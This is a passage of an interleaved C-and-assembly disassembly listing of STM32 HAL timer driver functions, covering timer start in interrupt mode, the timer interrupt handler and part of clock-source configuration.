 8004f7c:	2201      	movs	r2, #1
 8004f7e:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004f82:	687b      	ldr	r3, [r7, #4]
 8004f84:	2201      	movs	r2, #1
 8004f86:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004f8a:	2300      	movs	r3, #0
}
 8004f8c:	4618      	mov	r0, r3
 8004f8e:	3708      	adds	r7, #8
 8004f90:	46bd      	mov	sp, r7
 8004f92:	bd80      	pop	{r7, pc}

08004f94 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004f94:	b480      	push	{r7}
 8004f96:	b085      	sub	sp, #20
 8004f98:	af00      	add	r7, sp, #0
 8004f9a:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004f9c:	687b      	ldr	r3, [r7, #4]
 8004f9e:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004fa2:	b2db      	uxtb	r3, r3
 8004fa4:	2b01      	cmp	r3, #1
 8004fa6:	d001      	beq.n	8004fac <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004fa8:	2301      	movs	r3, #1
 8004faa:	e03b      	b.n	8005024 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004fac:	687b      	ldr	r3, [r7, #4]
 8004fae:	2202      	movs	r2, #2
 8004fb0:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004fb4:	687b      	ldr	r3, [r7, #4]
 8004fb6:	681b      	ldr	r3, [r3, #0]
 8004fb8:	68da      	ldr	r2, [r3, #12]
 8004fba:	687b      	ldr	r3, [r7, #4]
 8004fbc:	681b      	ldr	r3, [r3, #0]
 8004fbe:	f042 0201 	orr.w	r2, r2, #1
 8004fc2:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004fc4:	687b      	ldr	r3, [r7, #4]
 8004fc6:	681b      	ldr	r3, [r3, #0]
 8004fc8:	4a19      	ldr	r2, [pc, #100]	; (8005030 <HAL_TIM_Base_Start_IT+0x9c>)
 8004fca:	4293      	cmp	r3, r2
 8004fcc:	d009      	beq.n	8004fe2 <HAL_TIM_Base_Start_IT+0x4e>
 8004fce:	687b      	ldr	r3, [r7, #4]
 8004fd0:	681b      	ldr	r3, [r3, #0]
 8004fd2:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004fd6:	d004      	beq.n	8004fe2 <HAL_TIM_Base_Start_IT+0x4e>
 8004fd8:	687b      	ldr	r3, [r7, #4]
 8004fda:	681b      	ldr	r3, [r3, #0]
 8004fdc:	4a15      	ldr	r2, [pc, #84]	; (8005034 <HAL_TIM_Base_Start_IT+0xa0>)
 8004fde:	4293      	cmp	r3, r2
 8004fe0:	d115      	bne.n	800500e <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004fe2:	687b      	ldr	r3, [r7, #4]
 8004fe4:	681b      	ldr	r3, [r3, #0]
 8004fe6:	689a      	ldr	r2, [r3, #8]
 8004fe8:	4b13      	ldr	r3, [pc, #76]	; (8005038 <HAL_TIM_Base_Start_IT+0xa4>)
 8004fea:	4013      	ands	r3, r2
 8004fec:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004fee:	68fb      	ldr	r3, [r7, #12]
 8004ff0:	2b06      	cmp	r3, #6
 8004ff2:	d015      	beq.n	8005020 <HAL_TIM_Base_Start_IT+0x8c>
 8004ff4:	68fb      	ldr	r3, [r7, #12]
 8004ff6:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004ffa:	d011      	beq.n	8005020 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004ffc:	687b      	ldr	r3, [r7, #4]
 8004ffe:	681b      	ldr	r3, [r3, #0]
 8005000:	681a      	ldr	r2, [r3, #0]
 8005002:	687b      	ldr	r3, [r7, #4]
 8005004:	681b      	ldr	r3, [r3, #0]
 8005006:	f042 0201 	orr.w	r2, r2, #1
 800500a:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 800500c:	e008      	b.n	8005020 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 800500e:	687b      	ldr	r3, [r7, #4]
 8005010:	681b      	ldr	r3, [r3, #0]
 8005012:	681a      	ldr	r2, [r3, #0]
 8005014:	687b      	ldr	r3, [r7, #4]
 8005016:	681b      	ldr	r3, [r3, #0]
 8005018:	f042 0201 	orr.w	r2, r2, #1
 800501c:	601a      	str	r2, [r3, #0]
 800501e:	e000      	b.n	8005022 <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8005020:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8005022:	2300      	movs	r3, #0
}
 8005024:	4618      	mov	r0, r3
 8005026:	3714      	adds	r7, #20
 8005028:	46bd      	mov	sp, r7
 800502a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800502e:	4770      	bx	lr
 8005030:	40012c00 	.word	0x40012c00
 8005034:	40014000 	.word	0x40014000
 8005038:	00010007 	.word	0x00010007

0800503c <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 800503c:	b580      	push	{r7, lr}
 800503e:	b084      	sub	sp, #16
 8005040:	af00      	add	r7, sp, #0
 8005042:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8005044:	687b      	ldr	r3, [r7, #4]
 8005046:	681b      	ldr	r3, [r3, #0]
 8005048:	68db      	ldr	r3, [r3, #12]
 800504a:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 800504c:	687b      	ldr	r3, [r7, #4]
 800504e:	681b      	ldr	r3, [r3, #0]
 8005050:	691b      	ldr	r3, [r3, #16]
 8005052:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8005054:	68bb      	ldr	r3, [r7, #8]
 8005056:	f003 0302 	and.w	r3, r3, #2
 800505a:	2b00      	cmp	r3, #0
 800505c:	d020      	beq.n	80050a0 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 800505e:	68fb      	ldr	r3, [r7, #12]
 8005060:	f003 0302 	and.w	r3, r3, #2
 8005064:	2b00      	cmp	r3, #0
 8005066:	d01b      	beq.n	80050a0 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8005068:	687b      	ldr	r3, [r7, #4]
 800506a:	681b      	ldr	r3, [r3, #0]
 800506c:	f06f 0202 	mvn.w	r2, #2
 8005070:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8005072:	687b      	ldr	r3, [r7, #4]
 8005074:	2201      	movs	r2, #1
 8005076:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8005078:	687b      	ldr	r3, [r7, #4]
 800507a:	681b      	ldr	r3, [r3, #0]
 800507c:	699b      	ldr	r3, [r3, #24]
 800507e:	f003 0303 	and.w	r3, r3, #3
 8005082:	2b00      	cmp	r3, #0
 8005084:	d003      	beq.n	800508e <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8005086:	6878      	ldr	r0, [r7, #4]
 8005088:	f000 f9ad 	bl	80053e6 <HAL_TIM_IC_CaptureCallback>
 800508c:	e005      	b.n	800509a <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 800508e:	6878      	ldr	r0, [r7, #4]
 8005090:	f000 f99f 	bl	80053d2 <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005094:	6878      	ldr	r0, [r7, #4]
 8005096:	f000 f9b0 	bl	80053fa <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 800509a:	687b      	ldr	r3, [r7, #4]
 800509c:	2200      	movs	r2, #0
 800509e:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 80050a0:	68bb      	ldr	r3, [r7, #8]
 80050a2:	f003 0304 	and.w	r3, r3, #4
 80050a6:	2b00      	cmp	r3, #0
 80050a8:	d020      	beq.n	80050ec <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 80050aa:	68fb      	ldr	r3, [r7, #12]
 80050ac:	f003 0304 	and.w	r3, r3, #4
 80050b0:	2b00      	cmp	r3, #0
 80050b2:	d01b      	beq.n	80050ec <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 80050b4:	687b      	ldr	r3, [r7, #4]
 80050b6:	681b      	ldr	r3, [r3, #0]
 80050b8:	f06f 0204 	mvn.w	r2, #4
 80050bc:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 80050be:	687b      	ldr	r3, [r7, #4]
 80050c0:	2202      	movs	r2, #2
 80050c2:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 80050c4:	687b      	ldr	r3, [r7, #4]
 80050c6:	681b      	ldr	r3, [r3, #0]
 80050c8:	699b      	ldr	r3, [r3, #24]
 80050ca:	f403 7340 	and.w	r3, r3, #768	; 0x300
 80050ce:	2b00      	cmp	r3, #0
 80050d0:	d003      	beq.n	80050da <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 80050d2:	6878      	ldr	r0, [r7, #4]
 80050d4:	f000 f987 	bl	80053e6 <HAL_TIM_IC_CaptureCallback>
 80050d8:	e005      	b.n	80050e6 <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 80050da:	6878      	ldr	r0, [r7, #4]
 80050dc:	f000 f979 	bl	80053d2 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 80050e0:	6878      	ldr	r0, [r7, #4]
 80050e2:	f000 f98a 	bl	80053fa <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 80050e6:	687b      	ldr	r3, [r7, #4]
 80050e8:	2200      	movs	r2, #0
 80050ea:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 80050ec:	68bb      	ldr	r3, [r7, #8]
 80050ee:	f003 0308 	and.w	r3, r3, #8
 80050f2:	2b00      	cmp	r3, #0
 80050f4:	d020      	beq.n	8005138 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 80050f6:	68fb      	ldr	r3, [r7, #12]
 80050f8:	f003 0308 	and.w	r3, r3, #8
 80050fc:	2b00      	cmp	r3, #0
 80050fe:	d01b      	beq.n	8005138 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8005100:	687b      	ldr	r3, [r7, #4]
 8005102:	681b      	ldr	r3, [r3, #0]
 8005104:	f06f 0208 	mvn.w	r2, #8
 8005108:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 800510a:	687b      	ldr	r3, [r7, #4]
 800510c:	2204      	movs	r2, #4
 800510e:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8005110:	687b      	ldr	r3, [r7, #4]
 8005112:	681b      	ldr	r3, [r3, #0]
 8005114:	69db      	ldr	r3, [r3, #28]
 8005116:	f003 0303 	and.w	r3, r3, #3
 800511a:	2b00      	cmp	r3, #0
 800511c:	d003      	beq.n	8005126 <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 800511e:	6878      	ldr	r0, [r7, #4]
 8005120:	f000 f961 	bl	80053e6 <HAL_TIM_IC_CaptureCallback>
 8005124:	e005      	b.n	8005132 <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8005126:	6878      	ldr	r0, [r7, #4]
 8005128:	f000 f953 	bl	80053d2 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 800512c:	6878      	ldr	r0, [r7, #4]
 800512e:	f000 f964 	bl	80053fa <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8005132:	687b      	ldr	r3, [r7, #4]
 8005134:	2200      	movs	r2, #0
 8005136:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8005138:	68bb      	ldr	r3, [r7, #8]
 800513a:	f003 0310 	and.w	r3, r3, #16
 800513e:	2b00      	cmp	r3, #0
 8005140:	d020      	beq.n	8005184 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8005142:	68fb      	ldr	r3, [r7, #12]
 8005144:	f003 0310 	and.w	r3, r3, #16
 8005148:	2b00      	cmp	r3, #0
 800514a:	d01b      	beq.n	8005184 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 800514c:	687b      	ldr	r3, [r7, #4]
 800514e:	681b      	ldr	r3, [r3, #0]
 8005150:	f06f 0210 	mvn.w	r2, #16
 8005154:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8005156:	687b      	ldr	r3, [r7, #4]
 8005158:	2208      	movs	r2, #8
 800515a:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 800515c:	687b      	ldr	r3, [r7, #4]
 800515e:	681b      	ldr	r3, [r3, #0]
 8005160:	69db      	ldr	r3, [r3, #28]
 8005162:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8005166:	2b00      	cmp	r3, #0
 8005168:	d003      	beq.n	8005172 <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 800516a:	6878      	ldr	r0, [r7, #4]
 800516c:	f000 f93b 	bl	80053e6 <HAL_TIM_IC_CaptureCallback>
 8005170:	e005      	b.n	800517e <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8005172:	6878      	ldr	r0, [r7, #4]
 8005174:	f000 f92d 	bl	80053d2 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8005178:	6878      	ldr	r0, [r7, #4]
 800517a:	f000 f93e 	bl	80053fa <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 800517e:	687b      	ldr	r3, [r7, #4]
 8005180:	2200      	movs	r2, #0
 8005182:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8005184:	68bb      	ldr	r3, [r7, #8]
 8005186:	f003 0301 	and.w	r3, r3, #1
 800518a:	2b00      	cmp	r3, #0
 800518c:	d00c      	beq.n	80051a8 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 800518e:	68fb      	ldr	r3, [r7, #12]
 8005190:	f003 0301 	and.w	r3, r3, #1
 8005194:	2b00      	cmp	r3, #0
 8005196:	d007      	beq.n	80051a8 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8005198:	687b      	ldr	r3, [r7, #4]
 800519a:	681b      	ldr	r3, [r3, #0]
 800519c:	f06f 0201 	mvn.w	r2, #1
 80051a0:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 80051a2:	6878      	ldr	r0, [r7, #4]
 80051a4:	f7fb fe64 	bl	8000e70 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 80051a8:	68bb      	ldr	r3, [r7, #8]
 80051aa:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80051ae:	2b00      	cmp	r3, #0
 80051b0:	d00c      	beq.n	80051cc <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 80051b2:	68fb      	ldr	r3, [r7, #12]
 80051b4:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80051b8:	2b00      	cmp	r3, #0
 80051ba:	d007      	beq.n	80051cc <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 80051bc:	687b      	ldr	r3, [r7, #4]
 80051be:	681b      	ldr	r3, [r3, #0]
 80051c0:	f06f 0280 	mvn.w	r2, #128	; 0x80
 80051c4:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 80051c6:	6878      	ldr	r0, [r7, #4]
 80051c8:	f000 fa9a 	bl	8005700 <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 80051cc:	68bb      	ldr	r3, [r7, #8]
 80051ce:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80051d2:	2b00      	cmp	r3, #0
 80051d4:	d00c      	beq.n	80051f0 <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 80051d6:	68fb      	ldr	r3, [r7, #12]
 80051d8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80051dc:	2b00      	cmp	r3, #0
 80051de:	d007      	beq.n	80051f0 <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 80051e0:	687b      	ldr	r3, [r7, #4]
 80051e2:	681b      	ldr	r3, [r3, #0]
 80051e4:	f46f 7280 	mvn.w	r2, #256	; 0x100
 80051e8:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 80051ea:	6878      	ldr	r0, [r7, #4]
 80051ec:	f000 fa92 	bl	8005714 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 80051f0:	68bb      	ldr	r3, [r7, #8]
 80051f2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80051f6:	2b00      	cmp	r3, #0
 80051f8:	d00c      	beq.n	8005214 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 80051fa:	68fb      	ldr	r3, [r7, #12]
 80051fc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005200:	2b00      	cmp	r3, #0
 8005202:	d007      	beq.n	8005214 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8005204:	687b      	ldr	r3, [r7, #4]
 8005206:	681b      	ldr	r3, [r3, #0]
 8005208:	f06f 0240 	mvn.w	r2, #64	; 0x40
 800520c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 800520e:	6878      	ldr	r0, [r7, #4]
 8005210:	f000 f8fd 	bl	800540e <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8005214:	68bb      	ldr	r3, [r7, #8]
 8005216:	f003 0320 	and.w	r3, r3, #32
 800521a:	2b00      	cmp	r3, #0
 800521c:	d00c      	beq.n	8005238 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 800521e:	68fb      	ldr	r3, [r7, #12]
 8005220:	f003 0320 	and.w	r3, r3, #32
 8005224:	2b00      	cmp	r3, #0
 8005226:	d007      	beq.n	8005238 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8005228:	687b      	ldr	r3, [r7, #4]
 800522a:	681b      	ldr	r3, [r3, #0]
 800522c:	f06f 0220 	mvn.w	r2, #32
 8005230:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8005232:	6878      	ldr	r0, [r7, #4]
 8005234:	f000 fa5a 	bl	80056ec <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8005238:	bf00      	nop
 800523a:	3710      	adds	r7, #16
 800523c:	46bd      	mov	sp, r7
 800523e:	bd80      	pop	{r7, pc}

08005240 <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 8005240:	b580      	push	{r7, lr}
 8005242:	b084      	sub	sp, #16
 8005244:	af00      	add	r7, sp, #0
 8005246:	6078      	str	r0, [r7, #4]
 8005248:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 800524a:	2300      	movs	r3, #0
 800524c:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 800524e:	687b      	ldr	r3, [r7, #4]
 8005250:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005254:	2b01      	cmp	r3, #1
 8005256:	d101      	bne.n	800525c <HAL_TIM_ConfigClockSource+0x1c>
 8005258:	2302      	movs	r3, #2
 800525a:	e0b6      	b.n	80053ca <HAL_TIM_ConfigClockSource+0x18a>
 800525c:	687b      	ldr	r3, [r7, #4]
 800525e:	2201      	movs	r2, #1
 8005260:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8005264:	687b      	ldr	r3, [r7, #4]
 8005266:	2202      	movs	r2, #2
 8005268:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 800526c:	687b      	ldr	r3, [r7, #4]
 800526e:	681b      	ldr	r3, [r3, #0]
 8005270:	689b      	ldr	r3, [r3, #8]
 8005272:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8005274:	68bb      	ldr	r3, [r7, #8]
 8005276:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 800527a:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 800527e:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 8005280:	68bb      	ldr	r3, [r7, #8]
 8005282:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8005286:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8005288:	687b      	ldr	r3, [r7, #4]
 800528a:	681b      	ldr	r3, [r3, #0]
 800528c:	68ba      	ldr	r2, [r7, #8]
 800528e:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 8005290:	683b      	ldr	r3, [r7, #0]
 8005292:	681b      	ldr	r3, [r3, #0]
 8005294:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8005298:	d03e      	beq.n	8005318 <HAL_TIM_ConfigClockSource+0xd8>
 800529a:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 800529e:	f200 8087 	bhi.w	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052a2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 80052a6:	f000 8086 	beq.w	80053b6 <HAL_TIM_ConfigClockSource+0x176>
 80052aa:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 80052ae:	d87f      	bhi.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052b0:	2b70      	cmp	r3, #112	; 0x70
 80052b2:	d01a      	beq.n	80052ea <HAL_TIM_ConfigClockSource+0xaa>
 80052b4:	2b70      	cmp	r3, #112	; 0x70
 80052b6:	d87b      	bhi.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052b8:	2b60      	cmp	r3, #96	; 0x60
 80052ba:	d050      	beq.n	800535e <HAL_TIM_ConfigClockSource+0x11e>
 80052bc:	2b60      	cmp	r3, #96	; 0x60
 80052be:	d877      	bhi.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052c0:	2b50      	cmp	r3, #80	; 0x50
 80052c2:	d03c      	beq.n	800533e <HAL_TIM_ConfigClockSource+0xfe>
 80052c4:	2b50      	cmp	r3, #80	; 0x50
 80052c6:	d873      	bhi.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052c8:	2b40      	cmp	r3, #64	; 0x40
 80052ca:	d058      	beq.n	800537e <HAL_TIM_ConfigClockSource+0x13e>
 80052cc:	2b40      	cmp	r3, #64	; 0x40
 80052ce:	d86f      	bhi.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052d0:	2b30      	cmp	r3, #48	; 0x30
 80052d2:	d064      	beq.n	800539e <HAL_TIM_ConfigClockSource+0x15e>
 80052d4:	2b30      	cmp	r3, #48	; 0x30
 80052d6:	d86b      	bhi.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052d8:	2b20      	cmp	r3, #32
 80052da:	d060      	beq.n	800539e <HAL_TIM_ConfigClockSource+0x15e>
